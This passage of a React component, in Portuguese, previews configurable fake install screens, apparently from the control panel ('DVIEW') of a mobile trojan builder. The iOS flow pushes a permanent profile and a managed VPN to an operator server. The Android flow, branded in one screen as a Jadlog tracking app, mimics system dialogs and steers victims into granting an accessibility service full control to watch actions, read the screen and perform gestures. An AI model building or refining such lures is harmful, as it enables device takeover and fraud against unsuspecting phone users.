                                onClick={() => setPreviewStep(7)}
                              >
                                Prosseguir com a Instalação
                              </button>
                            </div>
                          )}

                          {/* TELA 07 — CONFIRMAÇÃO FINAL */}
                          {previewStep === 7 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "rgba(0,0,0,0.65)", justifyContent: "flex-end" }}>
                              <div style={{ background: "rgba(255, 255, 255, 0.95)", backdropFilter: "blur(20px)", borderRadius: "18px", padding: "18px", width: "100%", boxShadow: "0 -8px 24px rgba(0,0,0,0.4)" }}>
                                <h4 style={{ margin: "0 0 6px 0", fontSize: "15px", fontWeight: 700, color: "#000", textAlign: "center" }}>
                                  Instalar Perfil
                                </h4>
                                <p style={{ margin: "0 0 16px 0", fontSize: "11.5px", color: "#64748b", textAlign: "center" }}>
                                  O perfil '{appName}' será registrado de forma permanente no sistema iOS.
                                </p>
                                <button
                                  style={{ width: "100%", background: "#ef4444", color: "#fff", border: "none", borderRadius: "10px", padding: "12px", fontSize: "14px", fontWeight: 700, cursor: "pointer", marginBottom: "8px" }}
                                  onClick={() => setPreviewStep(8)}
                                >
                                  Instalar Perfil
                                </button>
                                <button
                                  style={{ width: "100%", background: "#e2e8f0", color: "#007aff", border: "none", borderRadius: "10px", padding: "10px", fontSize: "13px", fontWeight: 600, cursor: "pointer" }}
                                  onClick={() => setPreviewStep(4)}
                                >
                                  Cancelar
                                </button>
                              </div>
                            </div>
                          )}

                          {/* TELA 08 — PERFIL INSTALADO COM SUCESSO */}
                          {previewStep === 8 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "#f2f2f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
                              <div style={{ width: "100%", display: "flex", justifyContent: "flex-end" }}>
                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "14px", fontWeight: 700, cursor: "pointer" }} onClick={() => setPreviewStep(9)}>
                                  OK
                                </button>
                              </div>

                              <div style={{ textAlign: "center", margin: "auto 0" }}>
                                <div style={{ width: "54px", height: "54px", borderRadius: "50%", background: "#22c55e", display: "grid", placeItems: "center", margin: "0 auto 14px auto", boxShadow: "0 6px 18px rgba(34, 197, 94, 0.35)" }}>
                                  <Check size={32} style={{ color: "#ffffff" }} />
                                </div>
                                <h3 style={{ margin: "0 0 6px 0", fontSize: "18px", fontWeight: 800, color: "#000" }}>Perfil Instalado</h3>
                                <p style={{ margin: 0, fontSize: "12px", color: "#64748b" }}>
                                  '{appName}' está ativo e pronto para uso no iPhone.
                                </p>
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ width: "100%" }}
                                onClick={() => setPreviewStep(9)}
                              >
                                Ativar Conexão VPN
                              </button>
                            </div>
                          )}

                          {/* TELA 09 — CONEXÃO AUTOMÁTICA DE VPN */}
                          {previewStep === 9 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "14px", background: "#f2f2f7" }}>
                              <div style={{ margin: "4px 0 14px 0" }}>
                                <h3 style={{ margin: 0, fontSize: "18px", fontWeight: 800, color: "#000" }}>VPN e Gerenciamento</h3>
                                <span style={{ fontSize: "11px", color: "#64748b" }}>Ajustes → Geral → VPN</span>
                              </div>

                              <div className="ios-card" style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
                                <div>
                                  <strong style={{ fontSize: "13px", color: "#000", display: "block" }}>Status da VPN</strong>
                                  <span style={{ fontSize: "11px", color: "#16a34a", fontWeight: 600 }}>● Conectado</span>
                                </div>
                                <div style={{ width: "42px", height: "24px", background: "#22c55e", borderRadius: "12px", position: "relative" }}>
                                  <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", right: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
                                </div>
                              </div>

                              <div className="ios-card" style={{ marginBottom: "14px", fontSize: "11.5px", color: "#334155" }}>
                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0", borderBottom: "1px solid #f1f5f9" }}>
                                  <span style={{ color: "#64748b" }}>Perfil:</span>
                                  <strong>{appName} Secure Tunnel</strong>
                                </div>
                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0", borderBottom: "1px solid #f1f5f9" }}>
                                  <span style={{ color: "#64748b" }}>Tipo:</span>
                                  <strong>IKEv2 (IPsec Managed)</strong>
                                </div>
                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0" }}>
                                  <span style={{ color: "#64748b" }}>Servidor:</span>
                                  <strong>{serverUrl}</strong>
                                </div>
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ marginTop: "auto", width: "100%" }}
                                onClick={() => setPreviewStep(10)}
                              >
                                Abrir Tela de Início
                              </button>
                            </div>
                          )}

                          {/* TELA 10 — ÍCONE NA TELA DE INÍCIO & APP PRONTO */}
                          {previewStep === 10 && (
                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "linear-gradient(180deg, #1e293b, #0f172a)", color: "#ffffff", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                              <div style={{ textAlign: "center", margin: "10px 0" }}>
                                <div style={{ margin: "0 auto 10px auto", display: "flex", justifyContent: "center" }}>
                                  {renderAppLogo(52, 12)}
                                </div>
                                <h3 style={{ margin: "0 0 4px 0", fontSize: "17px", fontWeight: 800, color: "#ffffff" }}>
                                  {appName}
                                </h3>
                                <span style={{ fontSize: "11px", color: "#38bdf8", background: "rgba(56,189,248,0.15)", border: "1px solid rgba(56,189,248,0.3)", padding: "3px 8px", borderRadius: "10px", fontWeight: 700 }}>
                                  ● INSTALADO NO IPHONE
                                </span>
                              </div>

                              <div style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: "12px", padding: "12px", fontSize: "10.5px", fontFamily: "var(--font-mono)", color: "#cbd5e1" }}>
                                <div style={{ color: "#38bdf8", fontWeight: 700, marginBottom: "4px" }}>// APPLE IOS TELEMETRY:</div>
                                <div>• platform: <strong style={{ color: "#38bdf8" }}>"ios"</strong></div>
                                <div>• profile_status: <strong style={{ color: "#22c55e" }}>"enrolled"</strong></div>
                                <div>• vpn_tunnel: <strong style={{ color: "#22c55e" }}>"active (IKEv2)"</strong></div>
                                <div>• webclip_home: <strong style={{ color: "#22c55e" }}>"installed"</strong></div>
                              </div>

                              <button
                                className="ios-btn-blue"
                                style={{ width: "100%", background: screenConfig.accentColor || "#007aff" }}
                                onClick={() => showToast("Dispositivo Apple iOS pronto e conectado ao painel DVIEW!")}
                              >
                                Concluir & Voltar ao Início
                              </button>
                            </div>
                          )}
                        </>
                      )}

                      {/* SE PLATFORM FOR ANDROID */}
                      {platform === "android" && (
                        <>
                          {/* TELA 01 — CONFIRMAR INSTALAÇÃO (Nativo Android) */}
                          {previewStep === 1 && (
                        <div className="phone-screen-content" style={{ background: "#111827", padding: "16px", justifyContent: "flex-end" }}>
                          <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", opacity: 0.2 }}>
                            <Smartphone size={52} style={{ color: "#94a3b8" }} />
                            <span style={{ fontSize: "11px", color: "#64748b", marginTop: "8px" }}>Instalador de Pacotes</span>
                          </div>

                          {/* Diálogo Nativo Android de Confirmação */}
                          <div style={{
                            background: "#ffffff",
                            borderRadius: "18px",
                            padding: "18px",
                            color: "#0f172a",
                            boxShadow: "0 12px 36px rgba(0,0,0,0.6)",
                            width: "100%"
                          }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "14px" }}>
                              {renderAppLogo(42, 10)}
                              <div>
                                <h4 style={{ margin: 0, fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</h4>
                                <span style={{ fontSize: "11px", color: "#64748b" }}>{version}</span>
                              </div>
                            </div>

                            <p style={{ margin: "0 0 20px 0", fontSize: "13px", color: "#334155", fontWeight: 500 }}>
                              Quer instalar este aplicativo?
                            </p>

                            <div style={{ display: "flex", justifyContent: "flex-end", gap: "16px" }}>
                              <button
                                style={{ background: "transparent", border: "none", color: "#2563eb", fontWeight: 600, fontSize: "13px", cursor: "pointer", padding: "6px 10px" }}
                                onClick={() => showToast("Instalação cancelada")}
                              >
                                Cancelar
                              </button>
                              <button
                                style={{ background: "transparent", border: "none", color: "#2563eb", fontWeight: 700, fontSize: "13px", cursor: "pointer", padding: "6px 10px" }}
                                onClick={() => setPreviewStep(2)}
                              >
                                Instalar
                              </button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* TELA 02 — APLICATIVO EM INSTALAÇÃO / CARREGANDO (Fundo Branco, 4 Blocos, Barra Azul, Robô Android) */}
                      {previewStep === 2 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "20px 16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
                          {/* 4 Quadrados Coloridos no Topo (Grade 2x2) */}
                          <div style={{ marginTop: "20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
                            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 20px)", gap: "6px" }}>
                              <div style={{ width: "20px", height: "20px", background: "#38bdf8", borderRadius: "5px" }} />
                              <div style={{ width: "20px", height: "20px", background: "#ef4444", borderRadius: "5px" }} />
                              <div style={{ width: "20px", height: "20px", background: "#eab308", borderRadius: "5px" }} />
                              <div style={{ width: "20px", height: "20px", background: "#22c55e", borderRadius: "5px" }} />
                            </div>
                          </div>

                          {/* Centro: Card do App + Barra de Progresso + Texto Itálico Customizado */}
                          <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center", padding: "0 10px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "14px" }}>
                              {renderAppLogo(36, 8)}
                              <span style={{ fontSize: "16px", fontWeight: 700, color: "#0f172a" }}>
                                {appName}
                              </span>
                            </div>

                            {/* Barra de Progresso com Cor da Marca */}
                            <div style={{ width: "100%", height: "4px", background: "#e2e8f0", borderRadius: "2px", overflow: "hidden", marginBottom: "8px" }}>
                              <div style={{ width: "65%", height: "100%", background: screenConfig.accentColor || "#2563eb", borderRadius: "2px" }} />
                            </div>

                            {/* Subtexto em itálico configurável */}
                            <span style={{ fontSize: "11.5px", color: "#64748b", fontStyle: "italic", textAlign: "center" }}>
                              {screenConfig.loadingSubtext || "aguarde, atualização em andamento..."}
                            </span>
                          </div>

                          {/* Rodapé: Ícone Mascote Android Verde */}
                          <div style={{ marginBottom: "14px", display: "flex", flexDirection: "column", alignItems: "center" }}>
                            <svg width="34" height="34" viewBox="0 0 24 24" fill="#3DDC84">
                              <path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h4v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zM3.5 8C2.67 8 2 8.67 2 9.5v7c0 .83.67 1.5 1.5 1.5S5 17.33 5 16.5v-7C5 8.67 4.33 8 3.5 8zm17 0c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-7c0-.83-.67-1.5-1.5-1.5zm-4.97-5.84l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48C13.62 1.23 12.83 1 12 1s-1.62.23-2.64.63L7.88.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.3 1.3C6.73 3.14 5.5 4.93 5.5 7h13c0-2.07-1.23-3.86-2.97-4.84zM9 5c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm6 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/>
                            </svg>
                            <button
                              style={{ marginTop: "14px", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "6px", padding: "6px 16px", fontSize: "11px", fontWeight: 600, cursor: "pointer" }}
                              onClick={() => setPreviewStep(3)}
                            >
                              Avançar para Inicialização
                            </button>
                          </div>
                        </div>
                      )}

                      {/* TELA 03 — INICIALIZAÇÃO DO APLICATIVO (Fundo Preto, Badge Central, Spinner Ciano, Copyright) */}
                      {previewStep === 3 && (
                        <div className="phone-screen-content" style={{ background: "#000000", padding: "24px 16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
                          <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
                            {/* Badge Central com Logotipo do Aplicativo */}
                            {renderSplashLogo()}

                            {/* Spinner Circular em Arco Ciano Girando */}
                            <div className="cyan-spinner-arc" />
                          </div>

                          {/* Rodapé com Direitos Reservados Configuráveis */}
                          <div style={{ marginBottom: "12px", textAlign: "center" }}>
                            <p style={{ margin: "0 0 12px 0", fontSize: "10.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
                              © 25 {appName}. {screenConfig.copyrightText || "All Rights Reserved."}
                            </p>
                            <button
                              style={{ background: "#1e293b", border: "1px solid #334155", color: "#38bdf8", borderRadius: "6px", padding: "6px 14px", fontSize: "11px", fontWeight: 600, cursor: "pointer" }}
                              onClick={() => setPreviewStep(4)}
                            >
                              Ir para Configurações (Acessibilidade)
                            </button>
                          </div>
                        </div>
                      )}

                      {/* TELA 04 — CONFIGURAÇÕES DO ANDROID (ACESSIBILIDADE COM PONTO VERMELHO) */}
                      {previewStep === 4 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
                          {/* Barra de Navegação Superior Oficial */}
                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "10px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                              <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(3)} />
                              <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Acessibilidade</span>
                            </div>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px", color: "#64748b" }}>
                              <Search size={16} />
                              <span style={{ fontSize: "16px", fontWeight: "bold" }}>⋮</span>
                            </div>
                          </div>

                          {/* Lista Oficial de Configurações */}
                          <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>🟢</span>
                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Recomendado para você</span>
                              </div>
                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
                            </div>

                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>🔍</span>
                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Melhorias de visão</span>
                              </div>
                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
                            </div>

                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>💬</span>
                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>TalkBack</span>
                              </div>
                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
                            </div>

                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>🔊</span>
                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Audição</span>
                              </div>
                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
                            </div>

                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 12px", background: "#ffffff", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>⚙️</span>
                                <span style={{ fontSize: "12px", fontWeight: 500, color: "#1e293b" }}>Configurações avançadas</span>
                              </div>
                              <ChevronRight size={14} style={{ color: "#94a3b8" }} />
                            </div>

                            {/* Item Oficial Aplicativos Instalados com Ponto de Notificação Vermelho */}
                            <div
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                padding: "12px",
                                background: "#ffffff",
                                borderRadius: "8px",
                                border: "2px solid #ef4444",
                                boxShadow: "0 2px 10px rgba(239, 68, 68, 0.15)",
                                cursor: "pointer",
                                marginTop: "4px"
                              }}
                              onClick={() => setPreviewStep(5)}
                            >
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <span style={{ fontSize: "15px" }}>📱</span>
                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                  <span style={{ fontSize: "12.5px", fontWeight: 700, color: "#0f172a" }}>Aplicativos instalados</span>
                                  <div style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#ef4444", boxShadow: "0 0 6px #ef4444" }} />
                                </div>
                              </div>
                              <ChevronRight size={14} style={{ color: "#ef4444" }} />
                            </div>
                          </div>

                          <button
                            style={{ marginTop: "auto", width: "100%", background: "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
                            onClick={() => setPreviewStep(5)}
                          >
                            Acessar Aplicativos Instalados (Toque aqui)
                          </button>
                        </div>
                      )}

                      {/* TELA 05 — ACESSIBILIDADE → APLICATIVOS INSTALADOS (TRANSIÇÃO E FOCO) */}
                      {previewStep === 5 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                              <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(4)} />
                              <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Acessibilidade</span>
                            </div>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px", color: "#64748b" }}>
                              <Search size={16} />
                              <span style={{ fontSize: "16px", fontWeight: "bold" }}>⋮</span>
                            </div>
                          </div>

                          {/* Destaque com Foco e Instrução */}
                          <div style={{ padding: "12px", background: "#e0f2fe", border: "1px solid #38bdf8", borderRadius: "10px", marginBottom: "16px", fontSize: "11px", color: "#0369a1" }}>
                            <strong>Orientações ao Usuário:</strong>
                            <p style={{ margin: "4px 0 0 0" }}>Localize e clique na opção <strong>Aplicativos instalados</strong> indicada com a notificação vermelha para ativar o serviço.</p>
                          </div>

                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "space-between",
                              padding: "16px 14px",
                              background: "#ffffff",
                              borderRadius: "10px",
                              border: "2px solid #ef4444",
                              boxShadow: "0 4px 16px rgba(239, 68, 68, 0.25)",
                              cursor: "pointer"
                            }}
                            onClick={() => setPreviewStep(6)}
                          >
                            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                              <span style={{ fontSize: "20px" }}>📱</span>
                              <div>
                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                  <span style={{ fontSize: "13.5px", fontWeight: 800, color: "#0f172a" }}>Aplicativos instalados</span>
                                  <div style={{ width: "9px", height: "9px", borderRadius: "50%", background: "#ef4444", boxShadow: "0 0 8px #ef4444" }} />
                                </div>
                                <span style={{ fontSize: "10.5px", color: "#64748b" }}>Serviços baixados no dispositivo</span>
                              </div>
                            </div>
                            <span style={{ background: "#ef4444", color: "#fff", padding: "3px 8px", borderRadius: "4px", fontSize: "10px", fontWeight: 700 }}>
                              Toque aqui
                            </span>
                          </div>

                          <button
                            style={{ marginTop: "auto", width: "100%", background: "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
                            onClick={() => setPreviewStep(6)}
                          >
                            Abrir Lista de Aplicativos Instalados
                          </button>
                        </div>
                      )}

                      {/* TELA 06 — JADLOG RASTREIO — SERVIÇO OFF COM BALÃO FLUTUANTE */}
                      {previewStep === 6 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
                          {/* Cabeçalho */}
                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(5)} />
                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>Aplicativos Instalados</span>
                          </div>

                          {/* Lista com o Aplicativo Desativado / Off */}
                          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                            {/* Item do Aplicativo */}
                            <div
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                padding: "12px 14px",
                                background: "#ffffff",
                                borderRadius: "8px",
                                border: `1.5px solid ${screenConfig.accentColor || "#2563eb"}`,
                                cursor: "pointer"
                              }}
                              onClick={() => setPreviewStep(7)}
                            >
                              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                {renderAppLogo(28, 6)}
                                <div>
                                  <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a", display: "block" }}>
                                    {appName}
                                  </span>
                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>Desativado</span>
                                </div>
                              </div>
                              <span style={{ fontSize: "12px", color: "#64748b", fontWeight: 600 }}>Off</span>
                            </div>

                            {/* Balão Flutuante Escuro com Seta Apontando */}
                            <div className="phone-speech-callout" onClick={() => setPreviewStep(7)} style={{ cursor: "pointer" }}>
                              {screenConfig.speechCalloutText || "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."}
                            </div>
                          </div>

                          <button
                            style={{ marginTop: "auto", width: "100%", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
                            onClick={() => setPreviewStep(7)}
                          >
                            Configurar {appName}
                          </button>
                        </div>
                      )}

                      {/* TELA 07 — CONFIGURAÇÃO DO SERVIÇO */}
                      {previewStep === 7 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(6)} />
                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</span>
                          </div>

                          {/* Toggle Switch Card */}
                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #cbd5e1", padding: "14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px" }}>
                            <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a" }}>Usar {appName}</span>

                            {/* Toggle Off */}
                            <div
                              onClick={() => setPreviewStep(8)}
                              style={{ width: "42px", height: "24px", background: "#cbd5e1", borderRadius: "12px", position: "relative", cursor: "pointer", transition: "all 0.2s ease" }}
                              title="Toque para ativar"
                            >
                              <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", left: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
                            </div>
                          </div>

                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #e2e8f0", padding: "12px", fontSize: "11.5px", color: "#475569", lineHeight: "1.5" }}>
                            <strong>Sobre o serviço:</strong>
                            <p style={{ margin: "6px 0 0 0" }}>
                              {(screenConfig.serviceDescription || "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.").replace(/{appName}/g, appName)}
                            </p>
                          </div>

                          <button
                            style={{ marginTop: "auto", width: "100%", background: screenConfig.accentColor || "#2563eb", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
                            onClick={() => setPreviewStep(8)}
                          >
                            Ativar Chave do Serviço
                          </button>
                        </div>
                      )}

                      {/* TELA 08 — DIÁLOGO DE AUTORIZAÇÃO DO SISTEMA (MODAL DE SEGURANÇA ANDROID) */}
                      {previewStep === 8 && (
                        <div className="phone-screen-content" style={{ background: "#0f172a", padding: "16px", justifyContent: "center" }}>
                          <div style={{ background: "#ffffff", borderRadius: "20px", padding: "20px 18px", color: "#0f172a", boxShadow: "0 10px 30px rgba(0,0,0,0.6)" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
                              <ShieldAlert size={28} style={{ color: "#f59e0b", flexShrink: 0 }} />
                              <h4 style={{ margin: 0, fontSize: "14px", fontWeight: 700, color: "#0f172a" }}>
                                {(screenConfig.permissionDialogTitle || "Permitir controle total para {appName}?").replace(/{appName}/g, appName)}
                              </h4>
                            </div>

                            <div style={{ fontSize: "11px", color: "#334155", lineHeight: "1.45", margin: "10px 0 16px 0" }}>
                              <p style={{ margin: "0 0 6px 0", fontWeight: 600 }}>O serviço de acessibilidade precisa:</p>
                              • <strong>Observar suas ações</strong>: receber notificações ao interagir com um aplicativo.<br />
                              • <strong>Recuperar conteúdo da janela</strong>: inspecionar o conteúdo na tela.<br />
                              • <strong>Executar gestos</strong>: tocar e interagir com elementos autorizados.
                            </div>

                            <div style={{ display: "flex", justifyContent: "flex-end", gap: "12px" }}>
                              <button
                                style={{ background: "transparent", border: "none", color: "#64748b", fontWeight: 600, fontSize: "12.5px", cursor: "pointer", padding: "6px 10px" }}
                                onClick={() => setPreviewStep(7)}
                              >
                                Recusar
                              </button>
                              <button
                                style={{ background: screenConfig.accentColor || "#2563eb", border: "none", color: "#ffffff", fontWeight: 700, fontSize: "12.5px", cursor: "pointer", padding: "6px 14px", borderRadius: "6px" }}
                                onClick={() => setPreviewStep(9)}
                              >
                                Permitir
                              </button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* TELA 09 — CONCESSÃO E ATIVAÇÃO DO SERVIÇO (TOGGLE ON) */}
                      {previewStep === 9 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "12px 14px", background: "#f8fafc" }}>
                          <div style={{ display: "flex", alignItems: "center", gap: "8px", paddingBottom: "10px", borderBottom: "1px solid #e2e8f0", marginBottom: "14px" }}>
                            <ChevronLeft size={18} style={{ color: "#334155", cursor: "pointer" }} onClick={() => setPreviewStep(8)} />
                            <span style={{ fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</span>
                          </div>

                          {/* Toggle Switch Card Ativado */}
                          <div style={{ background: "#ffffff", borderRadius: "10px", border: "1px solid #22c55e", padding: "14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px", boxShadow: "0 2px 8px rgba(34, 197, 94, 0.15)" }}>
                            <div>
                              <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a", display: "block" }}>Usar {appName}</span>
                              <span style={{ fontSize: "10.5px", color: "#16a34a", fontWeight: 600 }}>Ativado</span>
                            </div>

                            {/* Toggle On */}
                            <div
                              onClick={() => setPreviewStep(10)}
                              style={{ width: "42px", height: "24px", background: "#22c55e", borderRadius: "12px", position: "relative", cursor: "pointer" }}
                              title="Serviço Ativado"
                            >
                              <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", right: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
                            </div>
                          </div>

                          <div style={{ background: "#f0fdf4", borderRadius: "10px", border: "1px solid #bbf7d0", padding: "12px", fontSize: "11.5px", color: "#166534" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: 700, marginBottom: "4px" }}>
                              <CheckCircle2 size={14} style={{ color: "#16a34a" }} />
                              Serviço de Acessibilidade Habilitado
                            </div>
                            O sistema operacional confirmou a inicialização do serviço. Retornando ao aplicativo...
                          </div>

                          <button
                            style={{ marginTop: "auto", width: "100%", background: "#22c55e", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer" }}
                            onClick={() => setPreviewStep(10)}
                          >
                            Retornar ao Aplicativo
                          </button>
                        </div>
                      )}

                      {/* TELA 10 — ATIVAÇÃO CONCLUÍDA / APP PRONTO */}
                      {previewStep === 10 && (
                        <div className="phone-screen-content phone-screen-light" style={{ padding: "16px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between", background: "#ffffff" }}>
                          <div style={{ width: "100%", display: "flex", flexDirection: "column", alignItems: "center", margin: "auto 0" }}>
                            {/* Badge do App */}
                            <div style={{
                              marginBottom: "12px"
                            }}>
                              {renderAppLogo(46, 12)}
                            </div>

                            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", justifyContent: "center", marginBottom: "12px" }}>
                              <div style={{ display: "inline-flex", alignItems: "center", gap: "6px", background: "#dcfce7", border: "1px solid #86efac", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#166534" }}>
                                <CheckCircle2 size={12} style={{ color: "#16a34a" }} />
